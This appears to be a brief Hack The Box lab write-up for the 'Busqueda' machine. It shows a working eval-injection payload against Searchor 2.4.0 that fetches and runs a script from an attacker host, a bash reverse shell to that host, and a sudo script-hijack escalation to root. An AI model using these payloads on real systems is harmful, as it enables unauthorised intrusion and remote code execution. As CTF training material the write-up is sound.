# HTB - Busqueda

## Summary

This is a pretty quick one. It just involves exploiting a vulnerability in "Searchor" to get a shell, and then using a sudo misconfiguration to privesc.  

<br />

## Initial Shell

nmap shows `22` and `80` open. Going to the webpage we can look at source and determine that this is using "Searchor 2.4.0"  
Searching the internet for Searchor 2.4.0 vulnerabilities, we find a page that says there is an arbitrary code execution vulnerability due to unsafe implementation of the eval method  
Searching for python eval injection, we can learn more about this sort of thing. Basically, we can send the following payload with Burp, to get a shell back to our box:  
```burp
engine=AOL&query=http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.14.6/shell|bash")','a','single'))%2b'&auto_redirect=
```
Before sending that, we need to start a nc listner on 8686, an http server on port 80 and add the following to a file "shell" to be served:  
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.6/8688 0>&1
```

Then sending the request with burp we get a shell back  

<br />

## Privilege Escalation

In `/var/www/app/.git/config` we can see our user's password written in plaintext.  
We can ssh to the box with that password to get a cleaner shell.  

`sudo -l` (requires the password we just found) shows us:
```bash  
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
That script must be run with a parameter matching a `.sh` file; there are three of these files in `/opt/scripts/`, we can mimic one `full-checkup.sh` and have it connect back to us with a bash reverse shell. This gets us root.  



